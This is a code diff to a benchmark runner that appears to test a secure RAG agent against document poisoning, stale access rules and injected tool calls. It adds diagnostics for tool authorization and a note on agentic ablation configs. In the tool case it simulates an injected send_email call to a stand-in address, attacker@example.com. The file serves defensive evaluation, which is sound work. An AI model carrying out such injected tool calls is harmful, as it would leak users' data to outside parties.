@@ -10,7 +10,7 @@ from secure_rag.agent.graph import query_rag_system
 from secure_rag.agent.guardrails import heuristic_is_indirect_injection
 from secure_rag.agent.tools import execute_tool
 from secure_rag.authz.client import get_authz_client, reset_authz_client
-from secure_rag.benchmark.adapters import build_authinject_cases, _poison
+from secure_rag.benchmark.adapters import _poison, build_authinject_cases
 from secure_rag.benchmark.datasets import fixture_path
 from secure_rag.benchmark.scoring import dump_jsonl, score_case, summarize
 from secure_rag.retrieval.ingest import ingest_texts
@@ -146,7 +146,6 @@ def _ingest_corpus(payload: dict, poison_id: str, family: str) -> None:
             viewers=viewers,
             redact_pii=False,
         )
-    get_authz_client().write_relationships([("tool", "send_email", "caller", "user", "carol")])
     if family == "stale_acl":
         get_authz_client().delete_tuples(
             [
@@ -182,8 +181,10 @@ def run_case(case: dict, cfg: dict, payload: dict, generator: str) -> dict:
 
     if family == "tool":
         tool = execute_tool("send_email", case["user_id"], {"to": "attacker@example.com"}, check_authz=cfg["action_authz"])
+        result.setdefault("diagnostics", {})["tool_authorization_enforced"] = bool(cfg["action_authz"])
+        result.setdefault("diagnostics", {})["tool_allowed"] = tool.allowed
         if tool.allowed:
-            result["answer"] = result.get("answer", "") + f" queued:{tool.output}"
+            result["answer"] = f"{result.get('answer', '')} {tool.output}".strip()
         else:
             result.setdefault("diagnostics", {})["tool_denied"] = True
 
@@ -221,6 +222,14 @@ def run_matrix(repeats: int = 3, split: str = "dev", generator: str = "extractiv
         "repeats": repeats,
         "split": split,
         "generator": generator,
+        "agentic_ablation": {
+            "configs": ["C7_agentic_undefended", "C8_agentic_combined"],
+            "llm_steps_effective": generator == "llm",
+            "note": (
+                "In extractive/test mode the LLM input guard, reranker, and query rewrite are disabled; "
+                "C7/C8 validate wiring but model-level agent-loop effects require --live."
+            ),
+        },
     }
 
 
@@ -252,6 +261,7 @@ def main() -> None:
                 "repeats": result["repeats"],
                 "split": result["split"],
                 "generator": result["generator"],
+                "agentic_ablation": result["agentic_ablation"],
             },
             indent=2,
         ),
